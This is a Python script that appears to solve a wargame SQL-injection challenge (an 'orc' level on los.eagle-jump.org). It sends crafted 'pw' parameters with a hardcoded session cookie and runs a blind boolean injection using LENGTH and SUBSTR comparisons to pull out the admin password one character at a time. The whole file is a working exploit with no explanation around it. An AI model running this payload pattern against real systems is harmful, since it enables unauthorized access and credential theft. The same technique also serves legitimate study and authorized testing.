import requests

url = 'https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php'
cookie = {'PHPSESSID': '4d0p7tg25oo1t92rlikt24i1q3'}

for length in range(4, 21):
    params = {'pw': f"' OR id='admin' AND LENGTH(pw)={length}#"}
    res = requests.get(url, params=params, cookies=cookie)

    if "Hello admin" in res.text:
        print(f"pw length is {length}")
        break

pw = ''
for i in range(length):
    print(f"=========checking start pw[{i}]=========")
    for j in range(33, 127):
        print(chr(j))
        params = {
            'pw': f"' OR id='admin' AND SUBSTR(pw, {i+1}, 1)='{chr(j)}'#"}
        res = requests.get(url, params=params, cookies=cookie)

        if "Hello admin" in res.text:
            print(f"pw[{i}] is {chr(j)}")
            pw += chr(j)
            break
print(pw)
